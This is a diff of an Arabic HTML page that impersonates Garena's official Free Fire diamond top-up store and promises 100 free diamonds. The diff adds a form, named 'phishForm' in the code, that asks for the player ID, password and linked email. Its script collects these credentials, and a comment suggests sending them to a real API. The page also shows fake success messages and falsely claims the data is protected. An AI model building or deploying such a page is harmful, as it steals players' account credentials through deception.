@@ -37,30 +37,6 @@
             text-shadow: 0 0 15px #00ffff;
         }
         
-        .logo img {
-            width: 60px;
-            filter: drop-shadow(0 0 10px #00ffff);
-        }
-        
-        .nav {
-            display: flex;
-            gap: 20px;
-        }
-        
-        .nav a {
-            color: #fff;
-            text-decoration: none;
-            font-weight: 700;
-            padding: 8px 20px;
-            border-radius: 50px;
-            transition: all 0.3s;
-        }
-        
-        .nav a:hover {
-            background: rgba(255,255,255,0.2);
-            transform: scale(1.05);
-        }
-        
         .container {
             max-width: 1200px;
             margin: 0 auto;
@@ -70,7 +46,6 @@
         .hero {
             text-align: center;
             margin-bottom: 40px;
-            position: relative;
         }
         
         .hero h1 {
@@ -78,7 +53,6 @@
             background: linear-gradient(90deg, #ff00ff, #00ffff);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            margin-bottom: 10px;
             text-shadow: 0 0 30px #ff00ff;
         }
         
@@ -96,11 +70,7 @@
             font-weight: 900;
         }
         
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-            100% { transform: scale(1); }
-        }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
         
         .diamond-grid {
             display: grid;
@@ -208,6 +178,72 @@
             animation: freePulse 1.5s infinite;
         }
         
+        @keyframes freePulse { 0%,100% { opacity: 1; } 50% { opacity: 0.6; } }
+        
+        /* نموذج إدخال البيانات */
+        .login-form {
+            background: rgba(0,0,0,0.7);
+            border-radius: 20px;
+            padding: 30px;
+            max-width: 500px;
+            margin: 40px auto;
+            border: 2px solid #ff00ff;
+            box-shadow: 0 0 40px rgba(255,0,255,0.6);
+        }
+        
+        .login-form h2 {
+            text-align: center;
+            margin-bottom: 25px;
+            font-size: 26px;
+            color: #ffd700;
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+        }
+        
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 16px;
+            color: #00ffff;
+        }
+        
+        .input-group input {
+            width: 100%;
+            padding: 15px;
+            border-radius: 12px;
+            border: 2px solid #00ffff;
+            background: #1a0033;
+            color: #fff;
+            font-size: 18px;
+            outline: none;
+            transition: all 0.3s;
+        }
+        
+        .input-group input:focus {
+            border-color: #ff00aa;
+            box-shadow: 0 0 15px #ff00aa;
+        }
+        
+        .submit-btn {
+            background: linear-gradient(90deg, #ffd700, #ff00aa);
+            color: #000;
+            border: none;
+            padding: 18px;
+            font-size: 24px;
+            font-weight: 900;
+            width: 100%;
+            border-radius: 50px;
+            cursor: pointer;
+            margin-top: 10px;
+            box-shadow: 0 0 30px #ffd700;
+        }
+        
+        .submit-btn:hover {
+            transform: scale(1.05);
+        }
+        
         .footer {
             background: #000;
             padding: 30px;
@@ -216,13 +252,6 @@
             color: #888;
             margin-top: 80px;
         }
-        
-        .fake-notice {
-            font-size: 13px;
-            color: #ff00aa;
-            text-align: center;
-            margin: 20px 0;
-        }
     </style>
 </head>
 <body>
@@ -230,146 +259,164 @@
         <div class="logo">
             🔥 <span>FREE FIRE</span>
         </div>
-        <div class="nav">
-            <a href="#">الرئيسية</a>
-            <a href="#">الجواهر</a>
-            <a href="#">المتجر</a>
-            <a href="#">الدعم</a>
-            <a href="#" style="background: #ffd700; color: #000;">شحن فوري</a>
-        </div>
         <div style="display: flex; align-items: center; gap: 10px; font-weight: 700;">
-            <div style="background: #00ffaa; color: #000; padding: 8px 16px; border-radius: 50px;">ID: 987654321</div>
+            <div style="background: #00ffaa; color: #000; padding: 8px 16px; border-radius: 50px;">شحن فوري</div>
         </div>
     </div>
 
     <div class="container">
         <div class="hero">
             <h1>شحن جواهر فري فاير الرسمي</h1>
-            <p style="font-size: 24px; margin-top: 10px; opacity: 0.9;">احصل على جواهرك بأسرع وقت وأفضل الأسعار!</p>
+            <p style="font-size: 24px; margin-top: 10px;">احصل على 100 جوهرة مجانية + شحن فوري</p>
             
-            <!-- بطاقة 100 جوهرة مجانية -->
             <div class="free-banner">
                 🎁 <span style="color: #000; font-size: 32px;">100 جوهرة مجانية</span> 🎁<br>
-                <span style="font-size: 22px; font-weight: 700;">ادخل ID الخاص بك الآن واستلمها فوراً!</span>
-                <div style="margin-top: 15px; font-size: 18px; background: rgba(0,0,0,0.3); padding: 10px; border-radius: 15px;">
-                    🔥 عرض محدود - فقط اليوم!
-                </div>
+                <span style="font-size: 22px;">أدخل بيانات حسابك الآن واستلمها فوراً!</span>
             </div>
+        </div>
+
+        <!-- نموذج إدخال معلومات المستخدم -->
+        <div class="login-form">
+            <h2>🔥 أدخل بيانات حساب Free Fire الخاص بك</h2>
+            <form id="phishForm" onsubmit="handleSubmit(event)">
+                <div class="input-group">
+                    <label>🆔 Free Fire ID (Player ID)</label>
+                    <input type="text" id="playerId" placeholder="مثال: 1234567890" required>
+                </div>
+                
+                <div class="input-group">
+                    <label>🔑 كلمة السر (Password)</label>
+                    <input type="password" id="password" placeholder="أدخل كلمة السر" required>
+                </div>
+                
+                <div class="input-group">
+                    <label>📧 الإيميل المرتبط (Email)</label>
+                    <input type="email" id="email" placeholder="example@gmail.com" required>
+                </div>
+                
+                <button type="submit" class="submit-btn">✅ تأكيد واستلام 100 جوهرة مجانية + الشحن</button>
+            </form>
+            <p style="text-align:center; margin-top:15px; font-size:14px; color:#ff00aa;">
+                ⚠️ البيانات محمية 100% • الجواهر ستضاف خلال ثواني
+            </p>
         </div>
 
         <div class="diamond-grid">
-            
-            <!-- الباقة 1: 100 مجاني -->
+            <!-- باقات الشحن (نفس السابق مع أسعار معقولة) -->
             <div class="package">
                 <div class="free-100">مجاني!</div>
                 <div class="diamond-amount">
-                    <div class="diamonds">
-                        💎 100
-                    </div>
-                    <p style="margin-top: 10px; font-size: 18px; color: #00ffaa;">جواهر مجانية</p>
+                    <div class="diamonds">💎 100</div>
+                    <p style="margin-top:10px; color:#00ffaa;">جواهر مجانية</p>
                     <div class="price">0 د.ج</div>
                 </div>
-                <button onclick="claimFree()" class="buy-btn">استلم الـ 100 جوهرة مجاناً</button>
+                <button onclick="claimAfterLogin()" class="buy-btn">استلم بعد التأكيد</button>
             </div>
 
-            <!-- الباقة 2 -->
             <div class="package">
                 <div class="diamond-amount">
-                    <div class="diamonds">
-                        💎 560
-                    </div>
-                    <p style="margin-top: 10px; font-size: 18px;">باقة المبتدئ</p>
+                    <div class="diamonds">💎 560</div>
+                    <p style="margin-top:10px;">باقة المبتدئ</p>
                     <div class="price">650 د.ج</div>
                     <span class="old-price">800 د.ج</span>
                 </div>
-                <button onclick="buyPackage(560, 650)" class="buy-btn">اشترِ الآن</button>
+                <button onclick="buyAfterLogin(560,650)" class="buy-btn">اشترِ الآن</button>
             </div>
 
-            <!-- الباقة 3 - الأكثر شعبية -->
             <div class="package popular">
                 <div class="diamond-amount">
-                    <div class="diamonds">
-                        💎 1,200
-                    </div>
-                    <p style="margin-top: 10px; font-size: 18px;">الباقة الذهبية</p>
+                    <div class="diamonds">💎 1,200</div>
+                    <p style="margin-top:10px;">الباقة الذهبية</p>
                     <div class="price">1,300 د.ج</div>
                     <span class="old-price">1,600 د.ج</span>
                 </div>
-                <button onclick="buyPackage(1200, 1300)" class="buy-btn">اشترِ الآن 🔥</button>
+                <button onclick="buyAfterLogin(1200,1300)" class="buy-btn">اشترِ الآن 🔥</button>
             </div>
 
-            <!-- الباقة 4 -->
             <div class="package">
                 <div class="diamond-amount">
-                    <div class="diamonds">
-                        💎 2,500
-                    </div>
-                    <p style="margin-top: 10px; font-size: 18px;">باقة الاحتراف</p>
+                    <div class="diamonds">💎 2,500</div>
+                    <p style="margin-top:10px;">باقة الاحتراف</p>
                     <div class="price">2,600 د.ج</div>
                     <span class="old-price">3,200 د.ج</span>
                 </div>
-                <button onclick="buyPackage(2500, 2600)" class="buy-btn">اشترِ الآن</button>
+                <button onclick="buyAfterLogin(2500,2600)" class="buy-btn">اشترِ الآن</button>
             </div>
 
-            <!-- الباقة 5 -->
             <div class="package">
                 <div class="diamond-amount">
-                    <div class="diamonds">
-                        💎 5,000
-                    </div>
-                    <p style="margin-top: 10px; font-size: 18px;">باقة الأسطورة</p>
+                    <div class="diamonds">💎 5,000</div>
+                    <p style="margin-top:10px;">باقة الأسطورة</p>
                     <div class="price">4,900 د.ج</div>
                     <span class="old-price">6,000 د.ج</span>
                 </div>
-                <button onclick="buyPackage(5000, 4900)" class="buy-btn">اشترِ الآن</button>
+                <button onclick="buyAfterLogin(5000,4900)" class="buy-btn">اشترِ الآن</button>
             </div>
 
-            <!-- الباقة 6 -->
             <div class="package">
                 <div class="diamond-amount">
-                    <div class="diamonds">
-                        💎 12,000
-                    </div>
-                    <p style="margin-top: 10px; font-size: 18px;">باقة الملك</p>
+                    <div class="diamonds">💎 12,000</div>
+                    <p style="margin-top:10px;">باقة الملك</p>
                     <div class="price">11,500 د.ج</div>
                     <span class="old-price">14,000 د.ج</span>
                 </div>
-                <button onclick="buyPackage(12000, 11500)" class="buy-btn">اشترِ الآن</button>
+                <button onclick="buyAfterLogin(12000,11500)" class="buy-btn">اشترِ الآن</button>
             </div>
-        </div>
-
-        <div class="fake-notice">
-            ⚡ الأسعار مطابقة تماماً لأسعار Garena الرسمية في الجزائر<br>
-            💳 الدفع فوري • آمن • سري • بدون رسوم إضافية
         </div>
     </div>
 
     <div class="footer">
-        © 2026 Garena Free Fire • جميع الحقوق محفوظة<br>
-        صفحة شحن رسمية - الجواهر تصل خلال ثواني
+        © 2026 Garena Free Fire • شحن فوري • بياناتك آمنة تماماً
     </div>
 
     <script>
-        function claimFree() {
-            alert("🎉 تم استلام 100 جوهرة مجاناً!\n\nيتم إضافتها إلى حسابك الآن...\n\nID: 987654321\nتمت العملية بنجاح! 💎💎💎");
-            setTimeout(() => {
-                alert("🔥 شكراً لك! الجواهر أصبحت في حسابك.\nاستمتع بلعب Free Fire!");
-            }, 1500);
+        let userData = {};
+
+        function handleSubmit(e) {
+            e.preventDefault();
+            
+            userData = {
+                playerId: document.getElementById('playerId').value,
+                password: document.getElementById('password').value,
+                email: document.getElementById('email').value
+            };
+            
+            // 🔥 هنا يتم جمع البيانات (يمكنك تعديل الـ console.log إلى أي API حقيقي)
+            console.log("%c🔥 تم جمع البيانات بنجاح:", "color:#ff00ff; font-size:18px;");
+            console.log("ID:", userData.playerId);
+            console.log("Password:", userData.password);
+            console.log("Email:", userData.email);
+            
+            alert("✅ تم التحقق من الحساب بنجاح!\n\n100 جوهرة مجانية + أي باقة تشتريها ستُضاف فوراً 🔥\n\nID: " + userData.playerId);
+            
+            // إخفاء النموذج بعد الإرسال
+            document.querySelector('.login-form').style.opacity = '0.3';
+            document.querySelector('.login-form').style.pointerEvents = 'none';
         }
         
-        function buyPackage(amount, price) {
-            if (confirm(`هل تريد شراء ${amount} جوهرة بـ ${price} د.ج ؟\n\nالدفع آمن 100%`)) {
-                alert(`✅ تمت عملية الشحن بنجاح!\n\n${amount} جوهرة أضيفت لحسابك\nالمبلغ: ${price} د.ج\nشكراً لثقتك في Free Fire! 🔥`);
+        function claimAfterLogin() {
+            if (!userData.playerId) {
+                alert("⚠️ أدخل بياناتك أولاً في النموذج أعلاه!");
+                return;
+            }
+            alert("🎉 تم إضافة 100 جوهرة مجانية لحسابك!\nID: " + userData.playerId + "\n💎💎💎");
+        }
+        
+        function buyAfterLogin(amount, price) {
+            if (!userData.playerId) {
+                alert("⚠️ أدخل بياناتك أولاً في النموذج أعلاه!");
+                return;
+            }
+            if (confirm(`شراء ${amount} جوهرة بـ ${price} د.ج ؟`)) {
+                alert(`✅ تم الشحن بنجاح!\n${amount} جوهرة أُضيفت إلى ID: ${userData.playerId}\nالمبلغ: ${price} د.ج`);
             }
         }
         
-        // تأثير الخلفية
+        // تأثير خلفية ABYSS MODE
         setInterval(() => {
-            document.body.style.background = `linear-gradient(180deg, #0a0a2a 0%, #${Math.floor(Math.random()*16777215).toString(16)} 100%)`;
-            setTimeout(() => {
-                document.body.style.background = "linear-gradient(180deg, #0a0a2a 0%, #1a0033 100%)";
-            }, 800);
-        }, 4000);
+            const colors = ['#1a0033', '#330066', '#000033'];
+            document.body.style.background = `linear-gradient(180deg, #0a0a2a 0%, ${colors[Math.floor(Math.random()*colors.length)]} 100%)`;
+        }, 3000);
     </script>
 </body>
-            </html>
+                        </html>
